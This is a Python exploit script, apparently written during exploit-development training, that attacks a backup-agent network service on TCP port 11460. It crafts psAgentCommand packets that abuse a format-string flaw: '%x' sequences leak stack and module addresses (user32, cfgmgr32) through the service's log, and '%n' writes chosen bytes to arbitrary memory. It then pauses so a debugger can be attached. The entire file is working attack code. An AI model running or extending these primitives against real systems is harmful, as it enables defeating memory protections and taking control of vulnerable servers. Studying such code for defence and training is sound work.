#!/usr/bin/env python3

import socket
import sys
from struct import pack


def receive_data(s: socket):
    received = b""
    continue_receive = True

    try:
        while continue_receive:
            data = s.recv(4096)
            received += data
            if len(data) < 4096:
                continue_receive = False
    except Exception as e:
        print(e)

    return received


def dump_stack_values_to_log(s: socket):
    # psAgentCommand
    buf = pack(">i", 0x400)
    buf += bytearray([0x41] * 0xC)
    buf += pack("<i", 0x604)  # opcode
    buf += pack("<i", 0x0)  # 1st memcpy: offset
    buf += pack("<i", 0x100)  # 1st memcpy: size field
    buf += pack("<i", 0x100)  # 2nd memcpy: offset
    buf += pack("<i", 0x100)  # 2nd memcpy: size field
    buf += pack("<i", 0x200)  # 3rd memcpy: offset
    buf += pack("<i", 0x100)  # 3rd memcpy: size field
    buf += bytearray([0x41] * 0x8)

    # psCommandBuffer
    buf += b"w00t:BBAAAA" + b"%x:" * 0x80
    buf += b"B" * 0x100
    buf += b"C" * 0x100

    # Padding
    buf += bytearray([0x41] * (0x404 - len(buf)))

    s.send(buf)


# Memory indices:
# 1 <- Stack address
# 11 <- windows_storage address.
# 13 <- user32 address.
# 17 <- cfgmgr32 address.
def get_latest_leaked_addresses_from_log(s: socket, startValue: int, return_value_count=21):
    w00t_finds = []
    while True:

        # psAgentCommand
        buf = pack(">i", 0x400)
        buf += bytearray([0x41] * 0xC)
        buf += pack("<i", 0x520)  # opcode
        buf += pack("<i", 0x0)  # 1st memcpy: offset
        buf += pack("<i", 0x100)  # 1st memcpy: size field
        buf += pack("<i", 0x100)  # 2nd memcpy: offset
        buf += pack("<i", 0x100)  # 2nd memcpy: size field
        buf += pack("<i", 0x200)  # 3rd memcpy: offset
        buf += pack("<i", 0x100)  # 3rd memcpy: size field
        buf += bytearray([0x41] * 0x8)

        # psCommandBuffer
        buf += b"FileType: %d ,Start: %d, Length: %d" % (1, startValue, 0x1000)
        buf += b"B" * 0x100
        buf += b"C" * 0x100

        # Padding
        buf += bytearray([0x41] * (0x404 - len(buf)))

        s.send(buf)

        response = s.recv(4)
        response_size = int(response.hex(), 16)

        print("Downloading... Start Value: " + str(hex(startValue)) + " Size: " + str(hex(response_size)))

        response = b""
        bytes_downloaded = 0
        try:
            while True:
                response += s.recv(4096)
                if len(response) >= response_size:
                    break
        except Exception as e:
            print(e)
            print(response_size)
            print(len(response))

        woot_split = response.split(b'w00t')

        if len(woot_split) > 1:
            for i in range(1, len(woot_split)):
                w00t_finds.append(woot_split[i][0:0x80 * 18])

        if response_size >= 0x100000:
            startValue += 0x1000
            continue

        break

    memory_values = []
    leaked_address_bytes = w00t_finds[-1].split(b':')
    returned_values = 0
    for leaked_address in leaked_address_bytes:
        try:
            memory_values.append(int(leaked_address, 16))
            returned_values += 1
            if returned_values >= return_value_count:
                break
        except:
            pass

    return memory_values


def print_memory_values(memory_values: list):
    for i in range(0, len(memory_values)):
        print("{}: {}".format(i, str(hex(memory_values[i]))))


def write_byte_value(s: socket, byte_value: int, write_address: int):
    if byte_value > 0xC6:
        width = byte_value - 0xC7 + 0x8
    else:
        width = byte_value + 0x39 + 0x8

    # psAgentCommand
    buf = pack(">i", 0x400)
    buf += bytearray([0x41] * 0xC)
    buf += pack("<i", 0x604)  # opcode
    buf += pack("<i", 0x0)  # 1st memcpy: offset
    buf += pack("<i", 0x100)  # 1st memcpy: size field
    buf += pack("<i", 0x100)  # 2nd memcpy: offset
    buf += pack("<i", 0x100)  # 2nd memcpy: size field
    buf += pack("<i", 0x200)  # 3rd memcpy: offset
    buf += pack("<i", 0x100)  # 3rd memcpy: size field
    buf += bytearray([0x41] * 0x8)

    # psCommandBuffer
    buf += b"w00t:BB" + pack("<i", write_address)
    buf += b"%x" * 5 + b":"
    buf += b"%6x:"
    buf += b"%x:" * 13
    buf += b"%" + b"%d" % width + b"x:"
    buf += b"%n"
    buf += b"%x" * 0x6b
    buf += b"B" * 0x100
    buf += b"C" * 0x100

    # Padding
    buf += bytearray([0x41] * (0x404 - len(buf)))

    s.send(buf)


def write_dword_value(s: socket, dword_value: int, write_address: int):
    for index in range(4):
        byte_value = dword_value >> (8 * index) & 0xff
        write_byte_value(s, byte_value, write_address + index)


def main():
    server = "192.168.185.10"
    if len(sys.argv) >= 2:
        server = sys.argv[1]

    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((server, port))

    print("Dumping values in the stack to the log...")
    dump_stack_values_to_log(s)
    receive_data(s)

    print("Retreiving values from the log...")
    memory_values = get_latest_leaked_addresses_from_log(s, 0x00)

    # value_to_write = 0x42
    # print("Writing " + str(hex(value_to_write)) + " to " + str(hex(memory_values[1] + 0x1000)))
    # write_value(s, value_to_write, memory_values[1] + 0x1000)
    # receive_data(s)

    memory_address = memory_values[1] + 0x1000
    # print("Writing values starting at " + hex(memory_address))
    # for x in range(0x00, 0x100):
    #     write_byte_value(s, x, memory_address)
    #     receive_data(s)
    #    memory_address += 1

    print("Writing dword value starting at " + hex(memory_address))
    write_dword_value(s, 0x12345678, memory_address)

    print("Pausing execution. Go into the debugger...")
    input()

    s.close()
    sys.exit(0)


if __name__ == "__main__":
    main()